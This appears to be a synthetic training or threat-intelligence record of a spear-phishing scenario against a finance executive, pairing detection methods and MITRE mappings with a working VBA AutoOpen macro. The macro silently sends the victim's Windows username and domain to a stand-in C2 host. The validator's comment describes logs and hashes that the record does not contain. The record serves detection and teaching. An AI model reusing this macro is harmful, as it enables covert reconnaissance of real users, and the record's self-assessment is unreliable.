attachment_info.macro_code_snippet:
Sub AutoOpen()
  Dim http As Object
  Set http = CreateObject("MSXML2.XMLHTTP")
  Dim url As String
  url = "http://malicious-c2.example.com/collect?data=" & URLEncode(Environ("USERNAME")) & "|" & URLEncode(Environ("USERDOMAIN"))
  http.Open "GET", url, False
  http.Send
End Sub
Function URLEncode(ByVal Text As String) As String
  Dim i As Integer
  Dim acode As Integer
  Dim outstr As String
  outstr = ""
  For i = 1 To Len(Text)
    acode = Asc(Mid(Text, i, 1))
    If (acode >= 48 And acode <= 57) Or (acode >= 65 And acode <= 90) Or (acode >= 97 And acode <= 122) Then
      outstr = outstr & Chr(acode)
    Else
      outstr = outstr & "%" & Hex(acode)
    End If
  Next i
  URLEncode = outstr
End Function
attachment_info.macro_behavior: On opening the Excel file, the AutoOpen macro sends a silent HTTP GET request to the attacker C2 server containing the victim's Windows username and domain, enabling targeted follow-up attacks.

technical_data.employee_communication_note: Unusual request for payment to Contoso Ltd. from a contact previously unknown to the finance executive; email contains personalized references and accurate internal invoice number, increasing likelihood of trust.

indicators.email_spoofing: From: olivia.johnson@trustedpartner.com (spoofed, IP 192.0.2.45 not on corporate allowlist)

example.detection_method: Email gateway anti-spam and anti-phishing rules detecting mismatched SPF/DKIM for trustedpartner.com; sandboxing attachment revealing macro making external HTTP connection; network IDS alert on HTTP GET to suspicious domain; user education prompting verification of unexpected invoice emails via phone.
relevant_mitre_techniques: T1071.001 - Application Layer Protocol: Web Protocols
T1113 - Screen Capture (potential later stage after initial compromise)

validation.comments: The sample accurately represents a spear phishing attack scenario targeting a specific individual (corporate finance executive) with personalized content and a malicious Excel attachment containing a macro designed to exfiltrate credentials. The technical data is comprehensive and realistic, including detailed email headers, body, attachment metadata, macro code snippet, SMTP logs, domain registration info, network capture, and mail server logs. Indicators clearly highlight the malicious domain, IP, attachment hashes, suspicious macro keywords, email spoofing evidence, and unusual HTTP requests, all supporting the spear phishing nature. The detection methods align well with recommended risk reduction strategies such as email gateway filtering, sandboxing, network IDS, and user education. Relevant MITRE ATT&CK techniques are correctly identified. Overall, the sample is complete, realistic, and correctly aligned with the problem description and risk reduction measures. No missing fields or inconsistencies were found.
